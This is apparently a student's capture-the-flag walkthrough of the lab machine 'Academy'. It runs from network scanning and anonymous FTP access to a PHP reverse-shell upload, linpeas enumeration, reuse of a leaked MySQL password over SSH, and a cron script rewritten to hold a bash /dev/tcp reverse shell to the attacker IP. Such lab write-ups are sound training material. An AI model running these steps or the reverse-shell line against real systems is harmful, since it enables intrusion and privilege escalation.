# **Academy**

## **Identifying target**
Target machine: windows cmd confirmation with ipconfig 192.168.64.134

# Confirming target machine on local network sudo arp-scan -l
    root@kali:/home/kali# arp-scan -l
    Interface: eth0, type: EN10MB, MAC: 00:0c:29:e4:4b:56, IPv4: 192.168.64.129
    Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
    192.168.64.1    00:50:56:c0:00:08       VMware, Inc.
    192.168.64.2    00:50:56:f7:bd:1d       VMware, Inc.
    192.168.64.134  00:0c:29:20:fc:5e       VMware, Inc.
    192.168.64.254  00:50:56:e1:67:05       VMware, Inc.
    4 packets received by filter, 0 packets dropped by kernel
    Ending arp-scan 1.9.7: 256 hosts scanned in 1.981 seconds (129.23 hosts/sec). 4 responded
    
## nmap scan on 192.168.64.134 | Version, all ports, speed.
nmap -A -P- -T4 192.168.63.134

    Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-29 09:03 EDT
    Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
    NSE Timing: About 0.00% done
    Nmap scan report for 192.168.64.134
    Host is up (0.00043s latency).
    Not shown: 65532 closed ports
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
    | ftp-syst: 
    |   STAT: 
    | FTP server status:
    |      Connected to ::ffff:192.168.64.129
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 4
    |      vsFTPd 3.0.3 - secure, fast, stable
    |_End of status
    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)
    |   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)
    |_  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)
    80/tcp open  http    Apache httpd 2.4.38 ((Debian))
    |_http-server-header: Apache/2.4.38 (Debian)
    |_http-title: Apache2 Debian Default Page: It works
    MAC Address: 00:0C:29:20:FC:5E (VMware)
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.80%E=4%D=10/29%OT=21%CT=1%CU=42972%PV=Y%DS=1%DC=D%G=Y%M=000C29%
    OS:TM=6720DD19%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=
    OS:I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%
    OS:O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W
    OS:6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=
    OS:O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD
    OS:=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0
    OS:%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
    OS:(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
    OS:=N%T=40%CD=S)
    
    Network Distance: 1 hop
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
    
    TRACEROUTE
    HOP RTT     ADDRESS
    1   0.43 ms 192.168.64.134

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 20.45 seconds

## nmap -sV -sC -T4 --top-ports 1000 192.168.64.134 | Version, default nmap scripting engine, top 1000 ports

    root@kali:/home/kali# nmap -sV -sC -T4 --top-ports 1000 192.168.64.134
    Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-29 09:08 EDT
    Nmap scan report for 192.168.64.134
    Host is up (0.00011s latency).
    Not shown: 997 closed ports
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
    | ftp-syst: 
    |   STAT: 
    | FTP server status:
    |      Connected to ::ffff:192.168.64.129
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 4
    |      vsFTPd 3.0.3 - secure, fast, stable
    |_End of status
    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)
    |   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)
    |_  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)
    80/tcp open  http    Apache httpd 2.4.38 ((Debian))
    |_http-server-header: Apache/2.4.38 (Debian)
    |_http-title: Apache2 Debian Default Page: It works
    MAC Address: 00:0C:29:20:FC:5E (VMware)
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 7.40 seconds
    root@kali:/home/kali# 

## Look at notes.txt found on FTP 21 *TBC CONTINUE HERE*

    FTP 192.168.64.134 

## Research found ports and versions
    21/tcp open  ftp     vsftpd 3.0.3
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    -rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
    
    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
    |   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)
    |   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)
    |_  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)
    
    80/tcp open  http    Apache httpd 2.4.38 ((Debian))
    |_http-server-header: Apache/2.4.38 (Debian)
    |_http-title: Apache2 Debian Default Page: It works

## Finding: http on port 80 is open.
    Target is running on Apache2 server
![image](https://github.com/user-attachments/assets/1af7ed07-91b4-4b82-8873-e1949cb1abb5)# 

## FTP on port 21 is open.
    ftp 192.168.64.134
    user: anonymous
    password: blank
    ls -al
![image](https://github.com/user-attachments/assets/0eb7e780-b9c5-4a24-8d05-25448c041b7a)

    on ftp server: get note.txt
    on attacking machine: more note.txt
![image](https://github.com/user-attachments/assets/069f6d4a-3035-4157-8246-89711bdcd326)

## Using DIRB to run directory enumeration
    dirb http://196.168.63.134
    Located http://192.168.64.134/phpmyadmin of interest
![image](https://github.com/user-attachments/assets/44cfa779-03b7-4920-9119-f2f288b7856b)

    Attempt to login to PHP admin panel.
    Fail with provided credentials and cracked hash from FTP server.

## Install Gobuster - GoLang based tool used for enemuration of Web and server based directories and files.
gobuster dir -u http://192.168.64.134 -w /usr/share/wordlists/rockyou.txt
    
    Found: http://192.168.64.134/academy/
    
    kali@kali:/usr/share/wordlists$ gobuster dir -u http://192.168.64.134 -w /usr/share/wordlists/rockyou.txt
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://192.168.64.134
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/rockyou.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    Progress: 3461 / 14344393 (0.02%)[ERROR] parse "http://192.168.64.134/!@#$%^": invalid URL escape "%^"
    /academy              (Status: 301) [Size: 318] [--> http://192.168.64.134/academy/]
    Progress: 16548 / 14344393 (0.12%)[ERROR] parse "http://192.168.64.134/!\"£$%^": invalid URL escape "%^"
    Progress: 23296 / 14344393 (0.16%)[ERROR] parse "http://192.168.64.134/!@#$%^&*()": invalid URL escape "%^&"
    /??????               (Status: 200) [Size: 10701]
    Progress: 29810 / 14344393 (0.21%)^C
    [!] Keyboard interrupt detected, terminating.
    Progress: 35668 / 14344393 (0.25%)
    ===============================================================
    Finished
    ===============================================================
    kali@kali:/usr/share/wordlists$

## Finding on http://192.168.64.134/academy/ student web portal.

![image](https://github.com/user-attachments/assets/e3aaeed5-89f9-42cc-b596-3ccf861ed33d)

    Tried Hashcat to crack cd73502828457d15655bbd7a63fb0bc8 however, dependencies on machine not available.
    Crackstation.com was used instead.
## U: 10201321  P: student login success
![image](https://github.com/user-attachments/assets/bd59fcfc-c641-4bce-ac16-ee16bd1c2893)

    Changed new password to password
    
## Has ability to upload files | look at hosted version and any exploitable vulnerabilities
80/tcp open  http    Apache httpd 2.4.38

![image](https://github.com/user-attachments/assets/e3734890-d762-4de9-bcc6-69aa59aa7a4b)

# TBC here
    1 tested file upload of .sh file type succesfull
    2 upload .php file containing reverse shell script 
    3 connection succesful via nc on attacker machine
    4 upgraded shell access to more stable version - python -c 'import pty; pty.spawn("/bin/sh")'
    5 on separate terminal set stty raw -echo | to allow reverse shell to behave more like a normal terminal | stty sane on normal terminal to break out and reset.
    6 cat /etc/passwd file to view the users on server to enumerate if we can possbily access any. Noted Grimmie had an executable script.
    7 cat grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash - Provided what seemed to be a backups file that removed itself
    8 attempted escalate priviliges locally such as "sudo, sudo su, su -" with no success. attempted to write new files with no success. atetmpted to download files with no success.
    9 further Post Exploitation enumeration, on attacking machine download linpeas.sh. host python -m http webserver, and wget linpeas.sh file from victim machine. wget http://192.168.64.129:8000/linpeas.sh
    10 run ./linpeas.sh > output.txt and view findings.
    11 findings: Admin account, MySQL, MySQL password: 
        /var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
        /var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
    12 At this point we attempt to ssh into victim machine to see if there has been password reuse, knowing that grimmie is likely an admin account. ssh grimmie@192.168.64.134 | password:"My_V3ryS3cur3_P4ss"
    13 in this step we should attempt to look at cronjobs [need to work on this part more] | such as downloading pspy on attacker machine and wget to execute pspy on victim machine.
    14 Since we have succesfully logged into grimmie's admin account, we can now nano the backup.sh file to perform another reverse shell to our attacker machine listening on port 3333. 
    
        #!/bin/bash
    
        bash -i >& /dev/tcp/192.168.64.129/3333 0>&1
        
    nc -nlvp 3333 on attacker machine
     15 connection succesful, cat flag.txt. We have now captured the flag.
